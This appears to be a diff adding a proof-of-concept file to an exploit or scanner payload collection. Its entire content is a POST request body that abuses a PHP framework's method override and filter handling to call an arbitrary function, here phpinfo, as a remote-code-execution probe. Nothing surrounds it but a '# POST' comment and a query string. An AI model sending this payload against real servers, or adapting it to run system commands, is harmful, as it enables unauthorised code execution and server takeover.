@@ -1,0 +1,4 @@
+# POST
+?s=index
+_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
+
